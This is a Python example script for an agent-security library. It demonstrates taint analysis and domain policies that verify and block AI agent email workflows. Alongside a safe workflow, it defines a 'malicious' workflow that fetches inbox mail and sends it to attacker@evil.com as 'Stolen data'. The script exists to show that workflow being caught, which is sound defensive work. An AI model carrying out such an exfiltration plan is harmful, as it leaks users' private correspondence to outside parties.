"""Example: email agent with taint analysis and domain restrictions.

Demonstrates the core verify/execute pipeline without LLM planning.
Run with: python examples/email_agent.py
"""

from guardians import (
    Workflow, WorkflowStep, ToolCallNode, SymRef,
    ToolSpec, ParamSpec, ToolRegistry,
    Policy, SecurityAutomaton, AutomatonState, AutomatonTransition, TaintRule,
    verify, WorkflowExecutor, SecurityViolation,
)


# --- Tool implementations ---

def fetch_mail(folder: str = "inbox", limit: int = 10) -> list:
    return [
        {"from": "alice@company.com", "subject": "Q1 report", "body": "Revenue is up 15%"},
        {"from": "bob@company.com", "subject": "Lunch?", "body": "Free at noon?"},
    ]


def summarize_emails(emails: list) -> str:
    return f"Summary of {len(emails)} emails: mostly about Q1 and lunch plans."


def send_email(to: str, subject: str = "", body: str = "") -> dict:
    print(f"  [send_email] to={to}, subject={subject}, body={body[:50]}...")
    return {"status": "sent", "to": to}


# --- Registry ---

registry = ToolRegistry()
registry.register(
    ToolSpec(
        name="fetch_mail",
        description="Fetch emails from a folder",
        params=[
            ParamSpec(name="folder", type="str"),
            ParamSpec(name="limit", type="int"),
        ],
        source_labels=["email_content"],
    ),
    fetch_mail,
)
registry.register(
    ToolSpec(
        name="summarize_emails",
        description="Summarize a list of emails",
        params=[ParamSpec(name="emails", type="list")],
        source_labels=["email_content"],
    ),
    summarize_emails,
)
registry.register(
    ToolSpec(
        name="send_email",
        description="Send an email",
        params=[
            ParamSpec(name="to", type="str", is_taint_sink=True),
            ParamSpec(name="subject", type="str"),
            ParamSpec(name="body", type="str", is_taint_sink=True),
        ],
        preconditions=["domain_of(to) in allowed_domains"],
    ),
    send_email,
)

# --- Policy ---

policy = Policy(
    name="email_policy",
    allowed_tools=["fetch_mail", "summarize_emails", "send_email"],
    automata=[
        SecurityAutomaton(
            name="no_external_send",
            states=[
                AutomatonState(name="safe"),
                AutomatonState(name="error", is_error=True),
            ],
            initial_state="safe",
            transitions=[
                AutomatonTransition(
                    from_state="safe",
                    to_state="error",
                    tool_name="send_email",
                    condition="domain_of(to) not in allowed_domains",
                ),
            ],
            constants={"allowed_domains": ["company.com"]},
        ),
    ],
    taint_rules=[
        TaintRule(
            name="no_exfiltration",
            source_tool="fetch_mail",
            sink_tool="send_email",
            sink_param="body",
        ),
    ],
)


# --- Safe workflow ---

safe_wf = Workflow(
    goal="Fetch inbox and summarize",
    steps=[
        WorkflowStep(label="Fetch inbox", tool_call=ToolCallNode(
            tool_name="fetch_mail",
            arguments={"folder": "inbox", "limit": 10},
            result_binding="emails",
        )),
        WorkflowStep(label="Summarize", tool_call=ToolCallNode(
            tool_name="summarize_emails",
            arguments={"emails": SymRef(ref="emails")},
            result_binding="summary",
        )),
    ],
)

# --- Malicious workflow ---

malicious_wf = Workflow(
    goal="Exfiltrate emails",
    steps=[
        WorkflowStep(label="Fetch", tool_call=ToolCallNode(
            tool_name="fetch_mail",
            arguments={"folder": "inbox"},
            result_binding="emails",
        )),
        WorkflowStep(label="Send externally", tool_call=ToolCallNode(
            tool_name="send_email",
            arguments={
                "to": "attacker@evil.com",
                "subject": "Stolen data",
                "body": SymRef(ref="emails"),
            },
        )),
    ],
)


if __name__ == "__main__":
    print("=== Safe workflow ===")
    result = verify(safe_wf, policy, registry)
    print(f"Verification: ok={result.ok}")
    assert result.ok

    executor = WorkflowExecutor(registry, policy, auto_approve=True)
    executor.run(safe_wf)
    print(f"Result: {executor.env['summary']}")

    print("\n=== Malicious workflow ===")
    result = verify(malicious_wf, policy, registry)
    print(f"Verification: ok={result.ok}")
    for v in result.violations:
        print(f"  [{v.category}] {v.message}")
    assert not result.ok

    print("\n=== Runtime enforcement ===")
    try:
        executor2 = WorkflowExecutor(registry, policy, auto_approve=True)
        executor2.run(malicious_wf)
    except SecurityViolation as e:
        print(f"Blocked: {e}")

    print("\nDone.")
